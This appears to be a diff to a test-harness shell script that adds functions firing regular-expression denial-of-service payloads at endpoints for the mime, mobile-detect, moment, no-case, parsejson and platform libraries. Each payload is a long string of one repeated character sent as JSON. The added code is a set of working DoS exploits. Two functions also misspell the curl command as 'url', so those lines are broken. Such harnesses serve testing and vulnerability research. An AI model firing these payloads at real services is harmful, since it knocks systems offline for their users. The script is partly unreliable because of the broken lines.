@@ -48,3 +48,39 @@ runLodashDos() {
     makeJson $fin
     curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/lodash/dos
 }
+
+runMimeDos(){
+    fin="$(generate 81750 "5")"
+    makeJson $fin
+    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/mime/dos
+}
+
+runMobileDetectDos(){
+    fin="$(generate 12500 "Dell")"
+    makeJson $fin
+    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/mobile_detect/dos
+}
+
+runMomentDos(){
+    fin="$(generate 50000 "1")"
+    makeJson $fin
+    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/moment/dos
+}
+
+runNoCaseDos(){
+    fin="$(generate 50000 "X")"
+    makeJson $fin
+    curl -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/no_case/dos
+}
+
+runParsejsonDos(){
+    fin="$(generate 50000 " ")"
+    makeJson $fin
+    url -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/parsejson/dos
+}
+
+runPlatformDos(){
+    fin="$(generate 30000 " ")"
+    makeJson $fin
+    url -d "@../data.json" -H "Content-Type: application/json" -X POST ${URL}/platform/dos
+}
